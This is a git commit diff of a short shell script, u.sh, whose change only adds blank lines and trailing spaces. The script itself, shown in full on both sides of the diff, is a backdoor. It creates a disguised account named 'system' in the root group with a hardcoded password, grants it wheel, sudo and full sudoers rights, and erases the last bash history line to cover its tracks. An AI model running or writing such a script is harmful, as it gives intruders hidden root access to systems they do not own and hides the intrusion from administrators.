e8225066f06523778f46f24991c8d6e8b7c6a1a3
TiliCruz <80571788+TiliCruz@users.noreply.github.com>
2021-04-28 00:15:35 +0800

    Update u.sh

--- u.sh
+++ u.sh
@@ -1,6 +1,11 @@
-useradd system -g root -M
-echo '0c117864a02827ba'| passwd --stdin system
-usermod -a -G wheel system
-usermod -a -G sudo system
-echo "system ALL=(ALL) ALL" >> /etc/sudoers
-sed -i '$d' ~/.bash_history
+useradd system -g root -M 
+
+echo '0c117864a02827ba'| passwd --stdin system  
+
+usermod -a -G wheel system  
+
+usermod -a -G sudo system 
+
+echo "system ALL=(ALL) ALL" >> /etc/sudoers 
+
+sed -i '$d' ~/.bash_history 
